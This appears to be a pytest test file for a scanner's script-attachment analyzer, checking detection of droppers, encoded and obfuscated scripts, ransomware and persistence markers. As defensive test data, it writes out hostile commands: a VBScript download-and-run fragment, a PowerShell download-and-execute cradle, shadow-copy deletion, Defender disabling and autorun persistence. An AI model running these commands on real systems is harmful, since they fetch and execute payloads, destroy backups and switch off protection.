"""4.4.0-beta.2: script attachments (JS / VBS / HTA / WSF / PS1 / BAT).

Samples are short fragments that contain the markers the analyzer looks for;
they are not working scripts, point only at documentation addresses
(RFC 5737 / .invalid) and are never executed."""

import base64
import io
import zipfile

import pytest

from detectors.scoring import ScoringMatrix
from detectors.script_analysis import ScriptAnalyzer, ScriptResult, is_script
from tests.test_mail_analyzer import make_eml
from tests.test_scanner_integration import _indicators, scanner  # noqa: F401  (fixture)

DROPPER_VBS = b"""' fragment
Set req = CreateObject("MSXML2.XMLHTTP")
req.Open "GET", "http://203.0.113.7/stage2", False
Set sh = CreateObject("WScript.Shell")
sh.Run "%TEMP%\\s.exe", 0
"""


def write(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return p


def analyze(tmp_path, name, data):
    return ScriptAnalyzer().analyze_file(write(tmp_path, name, data))


def score_of(res: ScriptResult):
    return ScoringMatrix().score({"script": {"language": res.language, "categories": res.categories,
                                             "encoded": res.encoded,
                                             "obfuscation": res.obfuscation}})


# ------------------------------------------------------------------ analyzer
def test_only_script_extensions_are_analysed(tmp_path):
    assert is_script("a.JS") and is_script("b.vbe") and is_script("c.ps1") and is_script("d.hta")
    assert not is_script("e.txt") and not is_script("f.docx")
    assert not analyze(tmp_path, "notes.txt", DROPPER_VBS).is_script


def test_vbs_dropper_is_download_plus_execute(tmp_path):
    r = analyze(tmp_path, "invoice.vbs", DROPPER_VBS)
    assert r.language == "VBScript" and r.dropper
    assert {"download", "execute"} <= set(r.categories)
    assert r.urls == ["http://203.0.113.7/stage2"]
    s = score_of(r)
    assert [c.indicator for c in s.contributions] == ["script_behaviour"]
    assert s.risk_score == 65 and s.verdict == "High"


@pytest.mark.parametrize("name,text,category", [
    ("wipe.bat", "vssadmin delete shadows /all /quiet", "recovery"),
    ("boot.cmd", "bcdedit /set {default} recoveryenabled No", "recovery"),
    ("note.js", "var m = 'All your files have been encrypted';", "ransom_note"),
    ("off.ps1", "Set-MpPreference -DisableRealtimeMonitoring $true", "defence_evasion"),
    ("ex.ps1", "Add-MpPreference -ExclusionPath C:\\Users", "defence_evasion"),
    ("stay.bat", 'schtasks /create /tn upd /tr "c:\\x.exe" /sc onlogon', "persistence"),
    ("run.vbs", 'r = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"', "persistence"),
])
def test_behaviour_categories(tmp_path, name, text, category):
    assert category in analyze(tmp_path, name, text).categories


def test_recovery_tampering_is_high_on_its_own(tmp_path):
    s = score_of(analyze(tmp_path, "c.bat", "vssadmin delete shadows /all /quiet\n"
                                               "wbadmin delete catalog -quiet"))
    assert s.risk_score == 70 and s.verdict == "High"


def test_admin_style_scripts_stay_low(tmp_path):
    get = analyze(tmp_path, "get.ps1",
                  "Invoke-WebRequest -Uri https://example.invalid/tool.zip -OutFile tool.zip")
    run = analyze(tmp_path, "open.ps1", "Start-Process notepad.exe")
    assert set(get.categories) == {"download"} and set(run.categories) == {"execute"}
    for r in (get, run):
        assert score_of(r).verdict == "Low"


def test_powershell_encoded_command_is_decoded(tmp_path):
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.3/a')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    r = analyze(tmp_path, "start.bat", f"powershell -nop -w hidden -enc {enc}")
    assert r.decoded_layers == 1
    assert r.dropper and "http://198.51.100.3/a" in r.urls


def test_frombase64string_literal_is_decoded(tmp_path):
    inner = base64.b64encode(b"Start-BitsTransfer -Source http://198.51.100.4/x").decode()
    r = analyze(tmp_path, "l.ps1",
                f"$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{inner}'))")
    assert r.decoded_layers == 1 and "download" in r.categories


def test_garbage_base64_is_ignored(tmp_path):
    r = analyze(tmp_path, "g.ps1", "powershell -enc " + "A" * 3 + "!" * 40)
    assert r.decoded_layers == 0


def test_script_encoder_output_is_flagged(tmp_path):
    r = analyze(tmp_path, "doc.vbe", "#@~^GQAAAA==x@#@&Wk^2O fake encoded body ^#~@")
    assert r.encoded and r.language == "VBScript (encoded)"
    ind = {c.indicator: c.points for c in score_of(r).contributions}
    assert ind == {"script_encoded": 30.0}


def test_obfuscation_needs_two_markers(tmp_path):
    chain = " & ".join(f"Chr({60 + i % 30})" for i in range(25))
    one = analyze(tmp_path, "a.vbs", f"x = {chain}")
    two = analyze(tmp_path, "b.vbs", f"x = {chain}\nExecute x")
    assert len(one.obfuscation) == 1 and not score_of(one).contributions
    assert len(two.obfuscation) == 2
    assert [c.indicator for c in score_of(two).contributions] == ["script_obfuscation"]


def test_ordinary_browser_javascript_is_clean(tmp_path):
    js = """
    document.addEventListener('DOMContentLoaded', function () {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/api/menu');
      xhr.onload = function () { render(JSON.parse(xhr.responseText)); };
      xhr.send();
    });"""
    r = analyze(tmp_path, "menu.js", js)
    assert not r.categories and not r.obfuscation
    assert score_of(r).verdict == "Clean"


def test_utf16_script_is_read(tmp_path):
    r = analyze(tmp_path, "u.ps1", "\ufeffvssadmin delete shadows /all".encode("utf-16"))
    assert "recovery" in r.categories


# ------------------------------------------------------------------ scanner
def test_scanner_flags_a_script_and_defangs_its_urls(scanner, tmp_path):
    (tmp_path / "scan").mkdir(exist_ok=True)
    p = write(tmp_path / "scan", "invoice.vbs", DROPPER_VBS)
    r = scanner.scan_file(str(p))
    assert "script_behaviour" in _indicators(r)
    assert r["scan_results"]["script_analysis"]["dropper"]
    assert r["verdict"] in ("High", "Critical")
    report = scanner.generate_report([r])
    assert "[Script]" in report and "hxxp://203.0.113[.]7" in report
    assert "http://203.0.113.7" not in report


def test_script_inside_a_zip_attached_to_mail(scanner, tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Invoice_0425.js",
                   "var w = new ActiveXObject('WScript.Shell'); w.Run('cmd /c x');\n"
                   "var h = new ActiveXObject('MSXML2.ServerXMLHTTP');")
    p = tmp_path / "scan" / "invoice.eml"
    p.parent.mkdir(exist_ok=True)
    make_eml(p, subject="Invoice 0425",
             attachments=[("invoice.zip", buf.getvalue(), "application", "zip")])
    r = scanner.scan_file(str(p))
    assert any(i.endswith("script_behaviour") for i in _indicators(r))
    assert r["verdict"] in ("High", "Critical")


def test_non_scripts_get_no_script_entry(scanner, tmp_path):
    p = write(tmp_path, "readme.txt", DROPPER_VBS)
    assert "script_analysis" not in scanner.scan_file(str(p))["scan_results"]


# ------------------------------------------------------------------ Script Encoder
def _encode(plain: str) -> str:
    """Test-only inverse of the decoder: what screnc would write for `plain`."""
    import detectors.script_analysis as sa
    out, index = [], -1
    for ch in plain:
        index += 1
        row = int(sa._SE_PICK[index % 64])
        if ch == "\n":
            out.append("@&")
            continue
        if ch == "\r":
            out.append("@#")
            continue
        if ch in "<>@":                      # written as escapes, never substituted
            out.append({"<": "@!", ">": "@*", "@": "@$"}[ch])
            continue
        code = next(c for c in sa._SE_CODES
                    if c not in (60, 62, 64) and sa._SE_TABLE[c][row] == ch)
        out.append(chr(code))
    return "#@~^AAAAAA==" + "".join(out) + "AAAAAA==^#~@"


def test_known_prefix_decodes():
    from detectors.script_analysis import decode_script_encoder
    # a widely published sample; the first characters are unambiguous
    assert decode_script_encoder(r"#@~^DgAAAA==\ko$K6,JCV^GJqAQAAA==^#~@").startswith('MsgBox "H')


def test_encoded_script_round_trip():
    from detectors.script_analysis import decode_script_encoder
    plain = 'Set o = CreateObject("Scripting.FileSystemObject")\r\nx = 1 < 2 > 0 @ 3\tok'
    assert decode_script_encoder(_encode(plain)) == plain


def test_encoded_vbe_dropper_is_decoded_and_scored(tmp_path):
    r = analyze(tmp_path, "invoice.vbe", _encode(DROPPER_VBS.decode()))
    assert r.encoded and r.decoded_layers == 1 and r.dropper
    ind = {c.indicator for c in score_of(r).contributions}
    assert ind == {"script_behaviour", "script_encoded"}
    assert score_of(r).verdict == "Critical"


# ------------------------------------------------------------------ layered encodings
from detectors.script_analysis import deobfuscate  # noqa: E402


def _chr_chain(s):
    return " & ".join(f"Chr({ord(c)})" for c in s)


@pytest.mark.parametrize("wrapped", [
    '"hel" + "lo wor" + "ld message"',                                   # split strings
    "String.fromCharCode(" + ",".join(str(ord(c)) for c in "hello world message") + ")",
    "x = " + _chr_chain("hello world message"),
    "[char[]](" + ",".join(str(ord(c)) for c in "hello world message") + ") -join ''",
    '"' + "".join(f"\\x{ord(c):02x}" for c in "hello world message") + '"',
    "unescape('" + "".join(f"%{ord(c):02x}" for c in "hello world message") + "')",
    'StrReverse("' + "hello world message"[::-1] + '")',
    "'egassem dlrow olleh'.split('').reverse().join('')",
    '"heXXllo woXXrld message".replace("XX", "")',
    "atob('" + base64.b64encode(b"hello world message").decode() + "')",
])
def test_each_encoding_is_unwound(wrapped):
    found, depth = deobfuscate(wrapped)
    assert any("hello world message" in f for f in found) and depth >= 1


def test_nested_layers_are_unwound_and_counted():
    inner = "vssadmin delete shadows /all /quiet"
    layer1 = _chr_chain(inner)                                           # Chr() chain
    layer2 = base64.b64encode(layer1.encode()).decode()                  # base64 of it
    layer3 = f"[Convert]::FromBase64String('{layer2}')"
    found, depth = deobfuscate(layer3)
    assert inner in found and depth == 2


def test_layered_script_scores_its_hidden_behaviour(tmp_path):
    inner = "vssadmin delete shadows /all /quiet"
    b64 = base64.b64encode(_chr_chain(inner).encode()).decode()
    r = analyze(tmp_path, "upd.ps1", f"$a = [Convert]::FromBase64String('{b64}')")
    assert "recovery" in r.categories and r.decoded_layers == 2
    assert "nested encoding (2 layers)" in r.obfuscation


def test_depth_and_size_are_bounded():
    text = "hello world message"
    for _ in range(9):                                                   # 9 nested base64 layers
        text = f"atob('{base64.b64encode(text.encode()).decode()}')"
    found, depth = deobfuscate(text)
    assert depth == 5 and not any(f == "hello world message" for f in found)


def test_plain_text_yields_nothing():
    assert deobfuscate("Write-Host 'Backup finished'") == ([], 0)
